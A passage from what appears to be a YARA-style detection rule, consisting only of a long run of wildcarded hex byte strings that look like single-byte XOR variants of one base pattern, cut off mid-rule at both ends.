58 59 58 59 58 5A ?? ?? 58 5A 58 59 58 5A ?? ?? 58 5B 58 5A 58 5C ?? ?? ?? ?? 58 5C 58 5A 58 5C ?? ?? ?? ?? 58 5D 58 59 58 5A ?? ?? } $s089 = { 59 58 59 58 59 5B ?? ?? 59 5B 59 58 59 5B ?? ?? 59 5A 59 5B 59 5D ?? ?? ?? ?? 59 5D 59 5B 59 5D ?? ?? ?? ?? 59 5C 59 58 59 5B ?? ?? } $s090 = { 5A 5B 5A 5B 5A 58 ?? ?? 5A 58 5A 5B 5A 58 ?? ?? 5A 59 5A 58 5A 5E ?? ?? ?? ?? 5A 5E 5A 58 5A 5E ?? ?? ?? ?? 5A 5F 5A 5B 5A 58 ?? ?? } $s091 = { 5B 5A 5B 5A 5B 59 ?? ?? 5B 59 5B 5A 5B 59 ?? ?? 5B 58 5B 59 5B 5F ?? ?? ?? ?? 5B 5F 5B 59 5B 5F ?? ?? ?? ?? 5B 5E 5B 5A 5B 59 ?? ?? } $s092 = { 5C 5D 5C 5D 5C 5E ?? ?? 5C 5E 5C 5D 5C 5E ?? ?? 5C 5F 5C 5E 5C 58 ?? ?? ?? ?? 5C 58 5C 5E 5C 58 ?? ?? ?? ?? 5C 59 5C 5D 5C 5E ?? ?? } $s093 = { 5D 5C 5D 5C 5D 5F ?? ?? 5D 5F 5D 5C 5D 5F ?? ?? 5D 5E 5D 5F 5D 59 ?? ?? ?? ?? 5D 59 5D 5F 5D 59 ?? ?? ?? ?? 5D 58 5D 5C 5D 5F ?? ?? } $s094 = { 5E 5F 5E 5F 5E 5C ?? ?? 5E 5C 5E 5F 5E 5C ?? ?? 5E 5D 5E 5C 5E 5A ?? ?? ?? ?? 5E 5A 5E 5C 5E 5A ?? ?? ?? ?? 5E 5B 5E 5F 5E 5C ?? ?? } $s095 = { 5F 5E 5F 5E 5F 5D ?? ?? 5F 5D 5F 5E 5F 5D ?? ?? 5F 5C 5F 5D 5F 5B ?? ?? ?? ?? 5F 5B 5F 5D 5F 5B ?? ?? ?? ?? 5F 5A 5F 5E 5F 5D ?? ?? } $s096 = { 60 61 60 61 60 62 ?? ?? 60 62 60 61 60 62 ?? ?? 60 63 60 62 60 64 ?? ?? ?? ?? 60 64 60 62 60 64 ?? ?? ?? ?? 60 65 60 61 60 62 ?? ?? } $s097 = { 61 60 61 60 61 63 ?? ?? 61 63 61 60 61 63 ?? ?? 61 62 61 63 61 65 ?? ?? ?? ?? 61 65 61 63 61 65 ?? ?? ?? ?? 61 64 61 60 61 63 ?? ?? } $s098 = { 62 63 62 63 62 60 ?? ?? 62 60 62 63 62 60 ?? ?? 62 61 62 60 62 66 ?? ?? ?? ?? 62 66 62 60 62 66 ?? ?? ?? ?? 62 67 62 63 62 60 ?? ?? } $s099 = { 63 62 63 62 63 61 ?? ?? 63 61 63 62 63 61 ?? ?? 63 60 63 61 63 67 ?? ?? ?? ?? 63 67 63 61 63 67 ?? ?? ?? ?? 63 66 63 62 63 61 ?? ?? } $s100 = { 64 65 64 65 64 66 ?? ?? 64 66 64 65 64 66 ?? ?? 64 67 64 66 64 60 ?? ?? ?? ?? 64 60 64 66 64 60 ?? ?? ?? ?? 64 61 64 65 64 66 ?? ?? } $s101 = { 65 64 65 64 65 67 ?? ?? 65 67 65 64 65 67 ?? ?? 65 66 65 67 65 61 ?? ?? ?? ?? 65 61 65 67 65 61 ?? ?? ?? ?? 65 60 65 64 65 67 ?? ?? } $s102 = { 66 67 66 67 66 64 ?? ?? 66 64 66 67 66 64 ?? ?? 66 65 66 64 66 62 ?? ?? ?? ?? 66 62 66 64 66 62 ?? ?? ?? ?? 66 63 66 67 66 64 ?? ?? } $s103 = { 67 66 67 66 67 65 ?? ?? 67 65 67 66 67 65 ?? ?? 67 64 67 65 67 63 ?? ?? ?? ?? 67 63 67 65 67 63 ?? ?? ?? ?? 67 62 67 66 67 65 ?? ?? } $s104 = { 68 69 68 69 68 6A ?? ?? 68 6A 68 69 68 6A ?? ?? 68 6B 68 6A 68 6C ?? ?? ?? ?? 68 6C 68 6A 68 6C ?? ?? ?? ?? 68 6D 68 69 68 6A ?? ?? } $s105 = { 69 68 69 68 69 6B ?? ?? 69 6B 69 68 69 6B ?? ?? 69 6A 69 6B 69 6D ?? ?? ?? ?? 69 6D 69 6B 69 6D ?? ?? ?? ?? 69 6C 69 68 69 6B ?? ?? } $s106 = { 6A 6B 6A 6B 6A 68 ?? ?? 6A 68 6A 6B 6A 68 ?? ?? 6A 69 6A 68 6A 6E ?? ?? ?? ?? 6A 6E 6A 68 6A 6E ?? ?? ?? ?? 6A 6F 6A 6B 6A 68 ?? ?? } $s107 = { 6B 6A 6B 6A 6B 69 ?? ?? 6B 69 6B 6A 6B 69 ?? ?? 6B 68 6B 69 6B 6F ?? ?? ?? ?? 6B 6F 6B 69 6B 6F ?? ?? ?? ?? 6B 6E 6B 6A 6B 69 ?? ?? } $s108 = { 6C 6D 6C 6D 6C 6E ?? ?? 6C 6E 6C 6D 6C 6E ?? ?? 6C 6F 6C 6E 6C 68 ?? ?? ?? ?? 6C 68 6C 6E 6C 68 ?? ?? ?? ?? 6C 69 6C 6D 6C 6E ?? ?? } $s109 = { 6D 6C 6D 6C 6D 6F ?? ?? 6D 6F 6D 6C 6D 6F ?? ?? 6D 6E 6D 6F 6D 69 ?? ?? ?? ?? 6D 69 6D 6F 6D 69 ?? ?? ?? ?? 6D 68 6D 6C 6D 6F ?? ?? } $s110 = { 6E 6F 6E 6F 6E 6C ?? ?? 6E 6C 6E 6F 6E 6C ?? ?? 6E 6D 6E 6C 6E 6A ?? ?? ?? ?? 6E 6A 6E 6C 6E 6A ?? ?? ?? ?? 6E 6B 6E 6F 6E 6C ?? ?? } $s111 = { 6F 6E 6F 6E 6F 6D ?? ?? 6F 6D 6F 6E 6F 6D ?? ?? 6F 6C 6F 6D 6F 6B ?? ?? ?? ?? 6F 6B 6F 6D 6F 6B ?? ?? ?? ?? 6F 6A 6F 6E 6F 6D ?? ?? } $s112 = { 70 71 70 71 70 72 ?? ?? 70 72 70 71 70 72 ?? ?? 70 73 70 72 70 74 ?? ?? ?? ?? 70 74 70 72 70 74 ?? ?? ?? ?? 70 75 70 71 70 72 ?? ?? } $s113 = { 71 70 71 70 71 73 ?? ?? 71 73 71 70 71 73 ?? ?? 71 72 71 73 71 75 ?? ?? ?? ?? 71 75 71 73 71 75 ?? ?? ?? ?? 71 74 71 70 71 73 ?? ?? } $s114 = { 72 73 72 73 72 70 ?? ?? 72 70 72 73 72 70 ?? ?? 72 71 72 70 72 76 ?? ?? ?? ?? 72 76 72 70 72 76 ?? ?? ?? ?? 72 77 72 73 72 70 ?? ?? } $s115 = { 73 72 73 72 73 71 ?? ?? 73 71 73 72 73 71 ?? ?? 73 70 73 71 73 77 ?? ?? ?? ?? 73 77 73 71 73 77 ?? ?? ?? ?? 73 76 73 72 73 71 ?? ?? } $s116 = { 74 75 74 75 74 76 ?? ?? 74 76 74 75 74 76 ?? ?? 74 77 74 76 74 70 ?? ?? ?? ?? 74 70 74 76 74 70 ?? ?? ?? ?? 74 71 74 75 74 76 ?? ?? } $s117 = { 75 74 75 74 75 77 ?? ?? 75 77 75 74 75 77 ?? ?? 75 76 75 77 75 71 ?? ?? ?? ?? 75 71 75 77 75 71 ?? ?? ?? ?? 75 70 75 74 75 77 ?? ?? } $s118 = { 76 77 76 77 76 74 ?? ?? 76 74 76 77 76 74 ?? ?? 76 75 76 74 76 72 ?? ?? ?? ?? 76 72 76 74 76 72 ?? ?? ?? ?? 76 73 76 77 76 74 ?? ?? } $s119 = { 77 76 77 76 77 75 ?? ?? 77 75 77 76 77 75 ?? ?? 77 74 77 75 77 73 ?? ?? ?? ?? 77 73 77 75 77 73 ?? ?? ?? ?? 77 72 77 76 77 75 ?? ?? } $s120 = { 78 79 78 79 78 7A ?? ?? 78 7A 78 79 78 7A ?? ?? 78 7B 78 7A 78 7C ?? ?? ?? ?? 78 7C 78 7A 78 7C ?? ?? ?? ?? 78 7D 78 79 78 7A ?? ?? } $s121 = { 79 78 79 78 79 7B ?? ?? 79 7B 79 78 79 7B ?? ?? 79 7A 79 7B 79 7D ?? ?? ?? ?? 79 7D 79 7B 79 7D ?? ?? ?? ?? 79 7C 79 78 79 7B ?? ?? } $s122 = { 7A 7B 7A 7B 7A 78 ?? ?? 7A 78 7A 7B 7A 78 ?? ?? 7A 79 7A 78 7A 7E ?? ?? ?? ?? 7A 7E 7A 78 7A 7E ?? ?? ?? ?? 7A 7F 7A 7B 7A 78 ?? ?? } $s123 = { 7B 7A 7B 7A 7B 79 ?? ?? 7B 79 7B 7A 7B 79 ?? ?? 7B 78 7B 79 7B 7F ?? ?? ?? ?? 7B 7F 7B 79 7B 7F ?? ?? ?? ?? 7B 7E 7B 7A 7B 79 ?? ?? } $s124 = { 7C 7D 7C 7D 7C 7E ?? ?? 7C 7E 7C 7D 7C 7E ?? ?? 7C 7F 7C 7E 7C 78 ?? ?? ?? ?? 7C 78 7C 7E 7C 78 ?? ?? ?? ?? 7C 79 7C 7D 7C 7E ?? ?? } $s125 = { 7D 7C 7D 7C 7D 7F ?? ?? 7D 7F 7D 7C 7D 7F ?? ?? 7D 7E 7D 7F 7D 79 ?? ?? ?? ?? 7D 79 7D 7F 7D 79 ?? ?? ?? ?? 7D 78 7D 7C 7D 7F ?? ?? } $s126 = { 7E 7F 7E 7F 7E 7C ?? ?? 7E 7C 7E 7F 7E 7C ?? ?? 7E 7D 7E 7C 7E 7A ?? ?? ?? ?? 7E 7A 7E 7C 7E 7A ?? ?? ?? ?? 7E 7B 7E 7F 7E 7C ?? ?? } $s127 = { 7F 7E 7F 7E 7F 7D ?? ?? 7F 7D 7F 7E 7F 7D ?? ?? 7F 7C 7F 7D 7F 7B ?? ?? ?? ?? 7F 7B 7F 7D 7F 7B ?? ?? ?? ?? 7F 7A 7F 7E 7F 7D ?? ?? } $s128 = { 80 81 80 81 80 82 ?? ?? 80 82 80 81 80 82 ?? ?? 80 83 80 82 80 84 ?? ?? ?? ?? 80 84 80 82 80 84 ?? ?? ?? ?? 80 85 80 81 80 82 ?? ?? } $s129 = { 81 80 81 80 81 83 ?? ?? 81 83 81 80 81 83 ?? ?? 81 82 81 83 81 85 ?? ?? ?? ?? 81 85 81 83 81 85 ?? ?? ?? ?? 81 84 81 80 81 83 ?? ?? } $s130 = { 82 83 82 83 82 80 ?? ?? 82 80 82 83 82 80 ?? ?? 82 81 82 80 82 86 ?? ?? ?? ?? 82 86 82 80 82 86 ?? ?? ?? ?? 82 87 82 83 82 80 ?? ?? } $s131 = { 83 82 83 82 83 81 ?? ?? 83 81 83 82 83 81 ?? ?? 83 80 83 81 83 87 ?? ?? ?? ?? 83 87 83 81 83 87 ?? ?? ?? ?? 83 86 83 82 83 81 ?? ?? } $s132 = { 84 85 84 85 84 86 ?? ?? 84 86 84 85 84 86 ?? ?? 84 87 84 86 84 80 ?? ?? ?? ?? 84 80 84 86 84 80 ?? ?? ?? ?? 84 81 84 85 84 86 ?? ?? } $s133 = { 85 84 85 84 85 87 ?? ?? 85 87 85 84 85 87 ?? ?? 85 86 85 87 85 81 ?? ?? ?? ?? 85 81 85 87 85 81 ?? ?? ?? ?? 85 80 85 84 85 87 ?? ?? } $s134 = { 86 87 86 87 86 84 ?? ?? 86 84 86 87 86 84 ?? ?? 86 85 86 84 86 82 ?? ?? ?? ?? 86 82 86 84 86 82 ?? ?? ?? ?? 86 83 86 87 86 84 ?? ?? } $s135 = { 87 86 87 86 87 85 ?? ?? 87 85 87 86 87 85 ?? ?? 87 84 87 85 87 83 ?? ?? ?? ?? 87 83 87 85 87 83 ?? ?? ?? ?? 87 82 87 86 87 85 ?? ?? } $s136 = { 88 89 88 89 88 8A ?? ?? 88 8A 88 89 88 8A ?? ?? 88 8B 88 8A 88 8C ?? ?? ?? ?? 88 8C 88 8A 88 8C ?? ?? ?? ?? 88 8D 88 89 88 8A ?? ?? } $s137 = { 89 88 89 88 89 8B ?? ?? 89 8B 89 88 89 8B ?? ?? 89 8A 89 8B 89 8D ?? ?? ?? ?? 89 8D 89 8B 89 8D ?? ?? ?? ?? 89 8C 89 88 89 8B ?? ?? } $s138 = { 8A 8B 8A 8B 8A 88 ?? ?? 8A 88 8A 8B 8A 88 ?? ?? 8A 89 8A 88 8A 8E ?? ?? ?? ?? 8A 8E 8A 88 8A 8E ?? ?? ?? ?? 8A 8F 8A 8B 8A 88 ?? ?? } $s139 = { 8B 8A 8B 8A 8B 89 ?? ?? 8B 89 8B 8A 8B 89 ?? ?? 8B 88 8B 89 8B 8F ?? ?? ?? ?? 8B 8F 8B 89 8B 8F ?? ?? ?? ?? 8B 8E 8B 8A 8B 89 ?? ?? } $s140 = { 8C 8D 8C 8D 8C 8E ?? ?? 8C 8E 8C 8D 8C 8E ?? ?? 8C 8F 8C 8E 8C 88 ?? ?? ?? ?? 8C 88 8C 8E 8C 88 ?? ?? ?? ?? 8C 89 8C 8D 8C 8E ?? ?? } $s141 = { 8D 8C 8D 8C 8D 8F ?? ?? 8D 8F 8D 8C 8D 8F ?? ?? 8D 8E 8D 8F 8D 89 ?? ?? ?? ?? 8D 89 8D 8F 8D 89 ?? ?? ?? ?? 8D 88 8D 8C 8D 8F ?? ?? } $s142 = { 8E 8F 8E 8F 8E 8C ?? ?? 8E 8C 8E 8F 8E 8C ?? ?? 8E 8D 8E 8C 8E 8A ?? ?? ?? ?? 8E 8A 8E 8C 8E 8A ?? ?? ?? ?? 8E 8B 8E 8F 8E 8C ?? ?? } $s143 = { 8F 8E 8F 8E 8F 8D ?? ?? 8F 8D 8F 8E 8F 8D ?? ?? 8F 8C 8F 8D 8F 8B ?? ?? ?? ?? 8F 8B 8F 8D 8F 8B ?? ?? ?? ?? 8F 8A 8F 8E 8F 8D ?? ?? } $s144 = { 90 91 90 91 90 92 ?? ?? 90 92 90 91 90 92 ?? ?? 90 93 90 92 90 94 ?? ?? ?? ?? 90 94 90 92 90 94 ?? ?? ?? ?? 90 95 90 91 90 92 ?? ?? } $s145 = { 91 90 91 90 91 93 ?? ?? 91 93 91 90 91 93 ?? ?? 91 92 91 93 91 95 ?? ?? ?? ?? 91 95 91 93 91 95 ?? ?? ?? ?? 91 94 91 90 91 93 ?? ?? } $s146 = { 92 93 92 93 92 90 ?? ?? 92 90 92 93 92 90 ?? ?? 92 91 92 90 92 96 ?? ?? ?? ?? 92 96 92 90 92 96 ?? ?? ?? ?? 92 97 92 93 92 90 ?? ?? } $s147 = { 93 92 93 92 93 91 ?? ?? 93 91 93 92 93 91 ?? ?? 93 90 93 91 93 97 ?? ?? ?? ?? 93 97 93 91 93 97 ?? ?? ?? ?? 93 96 93 92 93 91 ?? ?? } $s148 = { 94 95 94 95 94 96 ?? ?? 94 96 94 95 94 96 ?? ?? 94 97 94 96 94 90 ?? ?? ?? ?? 94 90 94 96 94 90 ?? ?? ?? ?? 94 91 94 95 94 96 ?? ?? } $s149 = { 95 94 95 94 95 97 ?? ?? 95 97 95 94 95 97 ?? ?? 95 96 95 97 95 91 ?? ?? ?? ?? 95 91 95 97 95 91 ?? ?? ?? ?? 95 90 95 94 95 97 ?? ?? } $s150 = { 96 97 96 97 96 94 ?? ?? 96 94 96 97 96 94 ?? ?? 96 95 96 94 96 92 ?? ?? ?? ?? 96 92 96 94 96 92 ?? ?? ?? ?? 96 93 96 97 96 94 ?? ?? } $s151 = { 97 96 97 96 97 95 ?? ?? 97 95 97 96 97 95 ?? ?? 97 94 97 95 97 93 ?? ?? ?? ?? 97 93 97 95 97 93 ?? ?? ?? ?? 97 92 97 96 97 95 ?? ?? } $s152 = { 98 99 98 99 98 9A ?? ?? 98 9A 98 99 98 9A ?? ?? 98 9B 98 9A 98 9C ?? ?? ?? ?? 98 9C 98 9A 98 9C ?? ?? ?? ?? 98 9D 98 99 98 9A ?? ?? } $s153 = { 99 98 99 98 99 9B ?? ?? 99 9B 99 98 99 9B ?? ?? 99 9A 99 9B 99 9D ?? ?? ?? ?? 99 9D 99 9B 99 9D ?? ?? ?? ?? 99 9C 99 98 99 9B ?? ?? } $s154 = { 9A 9B 9A 9B 9A 98 ?? ?? 9A 98 9A 9B 9A 98 ?? ?? 9A 99 9A 98 9A 9E ?? ?? ?? ?? 9A 9E 9A 98 9A 9E ?? ?? ?? ?? 9A 9F 9A 9B 9A 98 ?? ?? } $s155 = { 9B 9A 9B 9A 9B 99 ?? ?? 9B 99 9B 9A 9B 99 ?? ?? 9B 98 9B 99 9B 9F ?? ?? ?? ?? 9B 9F 9B 99 9B 9F ?? ?? ?? ?? 9B 9E 9B 9A 9B 99 ?? ?? } $s156 = { 9C 9D 9C 9D 9C 9E ?? ?? 9C 9E 9C 9D 9C 9E ?? ?? 9C 9F 9C 9E 9C 98 ?? ?? ?? ?? 9C 98 9C 9E 9C 98 ?? ?? ?? ?? 9C 99 9C 9D 9C 9E ?? ?? } $s157 = { 9D 9C 9D 9C 9D 9F ?? ?? 9D 9F 9D 9C 9D 9F ?? ?? 9D 9E 9D 9F 9D 99 ?? ?? ?? ?? 9D 99 9D 9F 9D 99 ?? ?? ?? ?? 9D 98 9D 9C 9D 9F ?? ?? } $s158 = { 9E 9F 9E 9F 9E 9C ?? ?? 9E 9C 9E 9F 9E 9C ?? ?? 9E 9D 9E 9C 9E 9A ?? ?? ?? ?? 9E 9A 9E 9C 9E 9A ?? ?? ?? ?? 9E 9B 9E 9F 9E 9C ?? ?? } $s159 = { 9F 9E 9F 9E 9F 9D ?? ?? 9F 9D 9F 9E 9F 9D ?? ?? 9F 9C 9F 9D 9F 9B ?? ?? ?? ?? 9F 9B 9F 9D 9F 9B ?? ?? ?? ?? 9F 9A 9F 9E 9F 9D ?? ?? } $s160 = { A0 A1 A0 A1 A0 A2 ?? ?? A0 A2 A0 A1 A0 A2 ?? ?? A0 A3 A0 A2 A0 A4 ?? ?? ?? ?? A0 A4 A0 A2 A0 A4 ?? ?? ?? ?? A0 A5 A0 A1 A0 A2 ?? ?? } $s161 = { A1 A0 A1 A0 A1 A3 ?? ?? A1 A3 A1 A0 A1 A3 ?? ?? A1 A2 A1 A3 A1 A5 ?? ?? ?? ?? A1 A5 A1 A3 A1 A5 ?? ?? ?? ?? A1 A4 A1 A0 A1 A3 ?? ?? } $s162 = { A2 A3 A2 A3 A2 A0 ?? ?? A2 A0 A2 A3 A2 A0 ?? ?? A2 A1 A2 A0 A2 A6 ?? ?? ?? ?? A2 A6 A2 A0 A2 A6 ?? ?? ?? ?? A2 A7 A2 A3 A2 A0 ?? ?? } $s163 = { A3 A2 A3 A2 A3 A1 ?? ?? A3 A1 A3 A2 A3 A1 ?? ?? A3 A0 A3 A1 A3 A7 ?? ?? ?? ?? A3 A7 A3 A1 A3 A7 ?? ?? ?? ?? A3 A6 A3 A2 A3 A1 ?? ?? } $s164 = { A4 A5 A4 A5 A4 A6 ?? ?? A4 A6 A4 A5 A4 A6 ?? ?? A4 A7 A4 A6 A4 A0 ?? ?? ?? ?? A4 A0 A4 A6 A4 A0 ?? ?? ?? ?? A4 A1 A4 A5 A4 A6 ?? ?? } $s165 = { A5 A4 A5 A4 A5 A7 ?? ?? A5 A7 A5 A4 A5 A7 ?? ?? A5 A6 A5 A7 A5 A1 ?? ?? ?? ?? A5 A1 A5 A7 A5 A1 ?? ?? ?? ?? A5 A0 A5 A4 A5 A7 ?? ?? } $s166 = { A6 A7 A6 A7 A6 A4 ?? ?? A6 A4 A6 A7 A6 A4 ?? ?? A6 A5 A6 A4 A6 A2 ?? ?? ?? ?? A6 A2 A6 A4 A6 A2 ?? ?? ?? ?? A6 A3 A6 A7 A6 A4 ?? ?? } $s167 = { A7 A6 A7 A6 A7 A5 ?? ?? A7 A5 A7 A6 A7 A5 ?? ?? A7 A4 A7 A5 A7 A3 ?? ?? ?? ?? A7 A3 A7 A5 A7 A3 ?? ?? ?? ?? A7 A2 A7 A6 A7 A5 ?? ?? } $s168 = { A8 A9 A8 A9 A8 AA ?? ?? A8 AA A8 A9 A8 AA ?? ?? A8 AB A8 AA A8 AC ?? ?? ?? ?? A8 AC A8 AA A8 AC ?? ?? ?? ?? A8 AD A8 A9 A8 AA ?? ?? } $s169 = { A9 A8 A9 A8 A9 AB ?? ?? A9 AB A9 A8 A9 AB ?? ?? A9 AA A9 AB A9 AD ?? ?? ?? ?? A9 AD A9 AB A9 AD ?? ?? ?? ?? A9 AC A9 A8 A9 AB ?? ?? } $s170 = { AA AB AA AB AA A8 ?? ?? AA A8 AA AB AA A8 ?? ?? AA A9 AA A8 AA AE ?? ?? ?? ?? AA AE AA A8 AA AE ?? ?? ?? ?? AA AF AA AB AA A8 ?? ?? } $s171 = { AB AA AB AA AB A9 ?? ?? AB A9 AB AA AB A9 ?? ?? AB A8 AB A9 AB AF ?? ?? ?? ?? AB AF AB A9 AB AF ?? ?? ?? ?? AB AE AB AA AB A9 ?? ?? } $s172 = { AC AD AC AD AC AE ?? ?? AC AE AC AD AC AE ?? ?? AC AF AC AE AC A8 ?? ?? ?? ?? AC A8 AC AE AC A8 ?? ?? ?? ?? AC A9 AC AD AC AE ?? ?? } $s173 = { AD AC AD AC AD AF ?? ?? AD AF AD AC AD AF ?? ?? AD AE AD AF AD A9 ?? ?? ?? ?? AD A9 AD AF AD A9 ?? ?? ?? ?? AD A8 AD AC AD AF ?? ?? } $s174 = { AE AF AE AF AE AC ?? ?? AE AC AE AF AE AC ?? ?? AE AD AE AC AE AA ?? ?? ?? ?? AE AA AE AC AE AA ?? ?? ?? ?? AE AB AE AF AE AC ?? ?? } $s175 = { AF AE AF AE AF AD ?? ?? AF AD AF AE AF AD ?? ?? AF AC AF AD AF AB ?? ?? ?? ?? AF AB AF AD AF AB ?? ?? ?? ?? AF AA AF AE AF AD ?? ?? } $s176 = { B0 B1 B0 B1 B0 B2 ?? ?? B0 B2 B0 B1 B0 B2 ?? ?? B0 B3 B0 B2 B0 B4 ?? ?? ?? ?? B0 B4 B0 B2 B0 B4 ?? ?? ?? ?? B0 B5 B0 B1 B0 B2 ?? ?? } $s177 = { B1 B0 B1 B0 B1 B3 ?? ?? B1 B3 B1 B0 B1 B3 ?? ?? B1 B2 B1 B3 B1 B5 ?? ?? ?? ?? B1 B5 B1 B3 B1 B5 ?? ?? ?? ?? B1 B4 B1 B0 B1 B3 ?? ?? } $s178 = { B2 B3 B2 B3 B2 B0 ?? ?? B2 B0 B2 B3 B2 B0 ?? ?? B2 B1 B2 B0 B2 B6 ?? ?? ?? ?? B2 B6 B2 B0 B2 B6 ?? ?? ?? ?? B2 B7 B2 B3 B2 B0 ?? ?? } $s179 = { B3 B2 B3 B2 B3 B1 ?? ?? B3 B1 B3 B2 B3 B1 ?? ?? B3 B0 B3 B1 B3 B7 ?? ?? ?? ?? B3 B7 B3 B1 B3 B7 ?? ?? ?? ?? B3 B6 B3 B2 B3 B1 ?? ?? } $s180 = { B4 B5 B4 B5 B4 B6 ?? ?? B4 B6 B4 B5 B4 B6 ?? ?? B4 B7 B4 B6 B4 B0 ?? ?? ?? ?? B4 B0 B4 B6 B4 B0 ?? ?? ?? ?? B4 B1 B4 B5 B4 B6 ?? ?? } $s181 = { B5 B4 B5 B4 B5 B7 ?? ?? B5 B7 B5 B4 B5 B7 ?? ?? B5 B6 B5 B7 B5 B1 ?? ?? ?? ?? B5 B1 B5 B7 B5 B1 ?? ?? ?? ?? B5 B0 B5 B4 B5 B7 ?? ?? } $s182 = { B6 B7 B6 B7 B6 B4 ?? ?? B6 B4 B6 B7 B6 B4 ?? ?? B6 B5 B6 B4 B6 B2 ?? ?? ?? ?? B6 B2 B6 B4 B6 B2 ?? ?? ?? ?? B6 B3 B6 B7 B6 B4 ?? ?? } $s183 = { B7 B6 B7 B6 B7 B5 ?? ?? B7 B5 B7 B6 B7 B5 ?? ?? B7 B4 B7 B5 B7 B3 ?? ?? ?? ?? B7 B3 B7 B5 B7 B3 ?? ?? ?? ?? B7 B2 B7 B6 B7 B5 ?? ?? } $s184 = { B8 B9 B8 B9 B8 BA ?? ?? B8 BA B8 B9 B8 BA ?? ?? B8 BB B8 BA B8 BC ?? ?? ?? ?? B8 BC B8 BA B8 BC ?? ?? ?? ?? B8 BD B8 B9 B8 BA ?? ?? } $s185 = { B9 B8 B9 B8 B9 BB ?? ?? B9 BB B9 B8 B9 BB ?? ?? B9 BA B9 BB B9 BD ?? ?? ?? ?? B9 BD B9 BB B9 BD ?? ?? ?? ?? B9 BC B9 B8 B9 BB ?? ?? } $s186 = { BA BB BA BB BA B8 ?? ?? BA B8 BA BB BA B8 ?? ?? BA B9 BA B8 BA BE ?? ?? ?? ?? BA BE BA B8 BA BE ?? ?? ?? ?? BA BF BA BB BA B8 ?? ?? } $s187 = { BB BA BB BA BB B9 ?? ?? BB B9 BB BA BB B9 ?? ?? BB B8 BB B9 BB BF ?? ?? ?? ?? BB BF BB B9 BB BF ?? ?? ?? ?? BB BE BB BA BB B9 ?? ?? } $s188 = { BC BD BC BD BC BE ?? ?? BC BE BC BD BC BE ?? ?? BC BF BC BE BC B8 ?? ?? ?? ?? BC B8 BC BE BC B8 ?? ?? ?? ?? BC B9 BC BD BC BE ?? ?? } $s189 = { BD BC BD BC BD BF ?? ?? BD BF BD BC BD BF ?? ?? BD BE BD BF BD B9 ?? ?? ?? ?? BD B9 BD BF BD B9 ?? ?? ?? ?? BD B8 BD BC BD BF ?? ?? } $s190 = { BE BF BE BF BE BC ?? ?? BE BC BE BF BE BC ?? ?? BE BD BE BC BE BA ?? ?? ?? ?? BE BA BE BC BE BA ?? ?? ?? ?? BE BB BE BF BE BC ?? ?? } $s191 = { BF BE BF BE BF BD ?? ?? BF BD BF BE BF BD ?? ?? BF BC BF BD BF BB ?? ?? ?? ?? BF BB BF BD BF BB ?? ?? ?? ?? BF BA BF BE BF BD ?? ?? } $s192 = { C0 C1 C0 C1 C0 C2 ?? ?? C0 C2 C0 C1 C0 C2 ?? ?? C0 C3 C0 C2 C0 C4 ?? ?? ?? ?? C0 C4 C0 C2 C0 C4 ?? ?? ?? ?? C0 C5 C0 C1 C0 C2 ?? ?? } $s193 = { C1 C0 C1 C0 C1 C3 ?? ?? C1 C3 C1 C0 C1 C3 ?? ?? C1 C2 C1 C3 C1 C5 ?? ?? ?? ?? C1 C5 C1 C3 C1 C5 ?? ?? ?? ?? C1 C4 C1 C0 C1 C3 ?? ?? } $s194 = { C2 C3 C2 C3 C2 C0 ?? ?? C2 C0 C2 C3 C2 C0 ?? ?? C2 C1 C2 C0 C2 C6 ?? ?? ?? ?? C2 C6 C2 C0 C2 C6 ?? ?? ?? ?? C2 C7 C2 C3 C2 C0 ?? ?? } $s195 = { C3 C2 C3 C2 C3 C1 ?? ?? C3 C1 C3 C2 C3 C1 ?? ?? C3 C0 C3 C1 C3 C7 ?? ?? ?? ?? C3 C7 C3 C1 C3 C7 ?? ?? ?? ?? C3 C6 C3 C2 C3 C1 ?? ?? } $s196 = { C4 C5 C4 C5 C4 C6 ?? ?? C4 C6 C4 C5 C4 C6 ?? ?? C4 C7 C4 C6 C4 C0 ?? ?? ?? ?? C4 C0 C4 C6 C4 C0 ?? ?? ?? ?? C4 C1 C4 C5 C4 C6 ?? ?? } $s197 = { C5 C4 C5 C4 C5 C7 ?? ?? C5 C7 C5 C4 C5 C7 ?? ?? C5 C6 C5 C7 C5 C1 ?? ?? ?? ?? C5 C1 C5 C7 C5 C1 ?? ?? ?? ?? C5 C0 C5 C4 C5 C7 ?? ?? } $s198 = { C6 C7 C6 C7 C6 C4 ?? ?? C6 C4 C6 C7 C6 C4 ?? ?? C6 C5 C6 C4 C6 C2 ?? ?? ?? ?? C6 C2 C6 C4 C6 C2 ?? ?? ?? ?? C6 C3 C6 C7 C6 C4 ?? ?? } $s199 = { C7 C6 C7 C6 C7 C5 ?? ?? C7 C5 C7 C6 C7 C5 ?? ?? C7 C4 C7 C5 C7 C3 ?? ?? ?? ?? C7 C3 C7 C5 C7 C3 ?? ?? ?? ?? C7 C2 C7 C6 C7 C5 ?? ?? } $s200 = { C8 C9 C8 C9 C8 CA ?? ?? C8 CA C8 C9 C8 CA ?? ?? C8 CB C8 CA C8 CC ?? ?? ?? ?? C8 CC C8 CA C8 CC ?? ?? ?? ?? C8 CD C8 C9 C8 CA ?? ?? } $s201 = { C9 C8 C9 C8 C9 CB ?? ?? C9 CB C9 C8 C9 CB ?? ?? C9 CA C9 CB C9 CD ?? ?? ?? ?? C9 CD C9 CB C9 CD ?? ?? ?? ?? C9 CC C9 C8 C9 CB ?? ?? } $s202 = { CA CB CA CB CA C8 ?? ?? CA C8 CA CB CA C8 ?? ?? CA C9 CA C8 CA CE ?? ?? ?? ?? CA CE CA C8 CA CE ?? ?? ?? ?? CA CF CA CB CA C8 ?? ?? } $s203 = { CB CA CB CA CB C9 ?? ?? CB C9 CB CA CB C9 ?? ?? CB C8 CB C9 CB CF ?? ?? ?? ?? CB CF CB C9 CB CF ?? ?? ?? ?? CB CE CB CA CB C9 ?? ?? } $s204 = { CC CD CC CD CC CE ?? ?? CC CE CC CD CC CE ?? ?? CC CF CC CE CC C8 ?? ?? ?? ?? CC C8 CC CE CC C8 ?? ?? ?? ?? CC C9 CC CD CC CE ?? ?? } $s205 = { CD CC CD CC CD CF ?? ?? CD CF CD CC CD CF ?? ?? CD CE CD CF CD C9 ?? ?? ?? ?? CD C9 CD CF CD C9 ?? ?? ?? ?? CD C8 CD CC CD CF ?? ?? } $s206 = { CE CF CE CF CE CC ?? ?? CE CC CE CF CE CC ?? ?? CE CD CE CC CE CA ?? ?? ?? ?? CE CA CE CC CE CA ?? ?? ?? ?? CE CB CE CF CE CC ?? ?? } $s207 = { CF CE CF CE CF CD ?? ?? 